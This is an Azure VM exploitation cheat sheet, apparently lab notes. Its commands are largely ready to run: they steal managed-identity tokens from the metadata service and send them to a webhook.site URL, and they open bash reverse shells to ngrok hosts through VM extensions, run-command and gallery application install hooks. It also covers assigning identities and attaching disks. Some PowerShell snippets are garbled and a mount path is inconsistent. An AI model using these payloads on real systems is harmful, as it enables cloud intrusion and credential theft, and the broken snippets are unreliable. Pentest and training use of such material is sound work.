---
title: "Virtual Machines Explotation"
order: 42
description: Explotation of Virtual Machines
---

## Get Identity inside VM

**System Managed Identity**

**Linux**

```bash
curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13&resource=https://vault.azure.net/"
```

**Windows**

```bash
Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" -Headers @{Metadata="true"}).access_token; Invoke-WebRequest -Uri "https://webhook.site/326f0173-d872-4afd-98c4-a02d1e892d08?token=$token" -Method GET'
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd)
```

### User Managed Identity

**Linux**

```bash
curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13&resource=https://vault.azure.net/&client_id=$CLIENT_ID"
```

**Windows**

```bash
Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/&client_id=$CLIENT_ID" -Headers @{Metadata="true"}).access_token; Invoke-WebRequest -Uri "https://webhook.site/326f0173-d872-4afd-98c4-a02d1e892d08?token=$token" -Method GET'
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd)
```

## Execute Arbitrary code in VM

> The permission needed is: 
> - Microsoft.Compute/virtualMachines/extensions/write
>
> This permission allows to execute extensions in virtual machines which allow to execute arbitrary code on them.

Verify the OS of the VM:

```bash
az vm show \
  --resource-group $RESOURCE_GROUP \
  --name $VM_NAME \
  --query "storageProfile.osDisk.osType" \
  -o tsv
```

**Linux VM**

Start ngrok

```bash
ngrok tcp 4444
```

Create the payload

```bash
$REVSHELL=(echo -n 'bash -i  >& /dev/tcp/x.tcp.eu.ngrok.io/PORT 0>&1  ' | base64)
```

Start the local listener

```bash
ncat -nvlp 4444
```

Set the malicious extension

```bash
az vm extension set \
  --resource-group $RESOURCE_GROUP \
  --vm-name $VM_NAME \
  --name CustomScript \
  --publisher Microsoft.Azure.Extensions \
  --version 2.1 \
  --settings '{}' \
  --protected-settings '{"commandToExecute": "nohup echo $REV_SHELL | base64 -d | nohup bash &"}'
```

**Windows VM**

We can exfiltrate to webhook the vault token

```bash
$cmd = '$token = (Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" -Headers @{Metadata="true"}).access_token; Invoke-WebRequest -Uri "https://webhook.site/326f0173-d872-4afd-98c4-a02d1e892d08?token=$token" -Method GET'
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
```

```bash
az vm extension set \
  --resource-group $RESOURCE_GROUP \
  --vm-name $VM_NAME \
  --name CustomScriptExtension \
  --publisher Microsoft.Compute \
  --version 1.10 \
  --settings '{"timestamp": 1}' \
  --protected-settings '{"commandToExecute": "powershell.exe -EncodedCommand JAB0AG8AawBlAG4AIAA9..."}'
```

## Assign User Identity 

### To VMs

> The permissions required are:
> - **Microsoft.Compute/virtualMachines/write** 
> - **Microsoft.ManagedIdentity/userAssignedIdentities/assign/action**
>
> Those permissions are enough to assign new managed identities to a VM. Note that a VM can have several managed identities. It can have the system assigned one, and many user managed identities.

First check the identities assigned to the VM

```bash
az vm identity show \
  --resource-group $RESOURCE_GROUP \
  --name $VM_NAME
```

Then assign a new identity

```bash
az vm identity assign \
  --resource-group $RESOURCE_GROUP \
  --name $VM_NAME \
  --identities "$MI_ID"
``` 

### To VM Applications

```bash
az vm application set \
  --resource-group "$RESOURCE_GROUP" \
  --name $VM_NAME \
  --app-version-ids "$IDENTITY" \
  --treat-deployment-as-failure true
```

## Run commands inside VM

> The permission required is:
> - Microsoft.Compute/virtualMachines/runCommand/action. 
>
> This is the most basic mechanism Azure provides to execute arbitrary commands in VMs.

revshell.sh file content

```bash
echo "bash -c 'bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/19159 0>&1'" > revshell.sh
```

```bash
az vm run-command invoke \
  --resource-group $RESOURCE_GROUP \
  --name $VM_NAME \
  --command-id RunShellScript \
  --scripts @revshell.sh
```

## Login trough bastion

```bash
az network bastion tunnel \
  --name $BASTION_NAME \
  --resource-group "$RESOURCE_GROUP" \
  --target-resource-id "$VM_ID" \
  --resource-port 22 \
  --port 50022
```

```bash
ssh -i /tmp/lab5_key \
    -p 50022 \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    azureuser@127.0.0.1
```

## Enumerate all Managed Identities of a VM

```bash
ARM_TOKEN=$(curl -s -H 'Metadata: true' \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | jq -r .access_token)

SUB="56c0b220-b032-47c9-b6af-69521f9c26e3"
RG="lab_6_vm_network_rg"
VM="lab_6_vm_network_vm"

curl -s -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Compute/virtualMachines/$VM?api-version=2023-09-01" \
  | jq '.identity'
```

## Create VM

> The following permissions are required:
> - Microsoft.Resources/deployments/write
> - Microsoft.Network/virtualNetworks/write
> - Microsoft.Network/networkSecurityGroups/write
> - Microsoft.Network/networkSecurityGroups/join/action
> - Microsoft.Network/publicIPAddresses/write
> - Microsoft.Network/publicIPAddresses/join/action
> - Microsoft.Network/networkInterfaces/write 
> - Microsoft.Compute/virtualMachines/write
> - Microsoft.Network/virtualNetworks/subnets/join/action
> - Microsoft.Network/networkInterfaces/join/action
> - Microsoft.ManagedIdentity/userAssignedIdentities/assign/action
> 
> All those are the necessary permissions to create a VM with a specific managed identity and leaving a port open (22 in this case). This allows a user to create a VM and connect to it and steal managed identity tokens to escalate privileges to it.

```bash
az vm create \
  --resource-group Resource_Group_1 \
  --name cli_vm \
  --image Ubuntu2204 \
  --admin-username azureuser \
  --generate-ssh-keys \
  --assign-identity /subscriptions/9291ff6e-6afb-430e-82a4-6f04b2d05c7f/resourcegroups/Resource_Group_1/providers/Microsoft.ManagedIdentity/userAssignedIdentities/TestManagedIdentity \
  --nsg-rule ssh \
  --location "centralus"
# By default pub key from ~/.ssh is used (if none, it's generated there)
```

We can also create a VM from Galery images. The first step is to enumerate the Community Galleries:

```bash
az sig list-community --location centralus --output table
```

Then check the image definitions:

```bash
az sig image-definition list-community \
  --location centralus \
  --public-gallery-name $GALLERY_NAME \
  --output table
```

And check the versions:

```bash
az sig image-version list-community \
  --location centralus \
  --public-gallery-name $GALLERY_NAME \
  --gallery-image-definition $IMAGE_DEF \
  --output table
```

Inspect the latest version

```bash
az sig image-version show-community \
  --location centralus \
  --public-gallery-name $GALLERY_NAME \
  --gallery-image-definition $IMAGE_DEF \
  --gallery-image-version $VERSION
```

The image id will be 

```bash
/CommunityGalleries/$GALLERY_NAME/Images/$IMAGE_DEF/Versions/$VERSION
```

```bash
az vm create \
  --resource-group $RESOURCE_GROUP \
  --name maliicous-vm \
  --location centralus \
  --image /CommunityGalleries/$GALLERY_NAME/Images/$IMAGE_DEF/Versions/$VERSION \
  --admin-username admin \
  --generate-ssh-keys \
  --size Standard_B2s \
  --public-ip-sku Standard \
  --nsg-rule SSH
```

## Execution upon new Gallery Application

> The permissions needed are: 
> - Microsoft.Compute/disks/write
> - Microsoft.Network/networkInterfaces/join/action
> - Microsoft.Compute/virtualMachines/write
> - Microsoft.Compute/galleries/applications/write
> - Microsoft.Compute/galleries/applications/versions/write
> 
> These are the required permissions to create a new gallery application and execute it inside a VM. Gallery applications can execute anything so an attacker could abuse this to compromise VM instances executing arbitrary commands.

**Create gallery (if the isn't any)**

```bash
az sig create --resource-group $RESOURCE_GROUP \
   --gallery-name myGallery \
   --location "centralus"
```

**Create application container**

```bash
az sig gallery-application create \
  --application-name myReverseShellApp \
  --gallery-name myGallery \
  --resource-group "$RESOURCE_GROUP" \
  --os-type Linux \
  --location centralus
```

**Create app version with the rev shell**

In Package file link just add any link to a blob storage file

```bash
az sig gallery-application version create \
  --version-name 1.0.1 \
  --application-name myReverseShellApp \
  --gallery-name myGallery \
  --location centralus \
  --resource-group "$RESOURCE_GROUP" \
  --package-file-link "https:/$STORAGE_ACCOUNT.blob.core.windows.net/package-container/package.txt" \
  --install-command "bash -c 'bash -i >& /dev/tcp/x.tcp.eu.ngrok.io/PORT 0>&1'" \
  --remove-command "bash -c 'bash -i >& /dev/tcp/x.tcp.eu.ngrok.io/PORT 0>&1'" \
  --update-command "bash -c 'bash -i >& /dev/tcp/x.tcp.eu.ngrok.io/PORT 0>&1'"
```

## Attach Disk to VM

> The following permissions are required:
> - Microsoft.Compute/virtualMachines/write
> - Microsoft.Compute/virtualMachines/read
> - Microsoft.Compute/disks/read
> - Microsoft.Network/networkInterfaces/read
> - Microsoft.Network/networkInterfaces/join/action
> - Microsoft.Compute/disks/write
>
> These permissions allow you to manage disks and network interfaces, and they enable you to attach a disk to a virtual machine.

Update the disk's network access policy

```bash
az disk update \
  --name $DISK_NAME \
  --resource-group $RESOURCE_GROUP \
  --network-access-policy AllowAll
```

Attach the disk to a virtual machine

```bash
az vm disk attach \
  --vm-name $VM_NAME \
  --resource-group $RESOURCE_GROUP \
  --name $DISK_NAME
```

Login into vm and mount the disk:

```bash
lsblk
----

sda    7G    disk    /mnt           ← Azure ephemeral
sdb    30G   disk    /              ← disco OS
sdc    1G    disk    (sin montar)   ← target-disk
```

```bash
sudo blkid /dev/sdc
sudo mkdir -p /mnt/targetdisk
sudo mount /dev/sdc /mnt/targetdisk
ls -la /mnt/flagdisk
```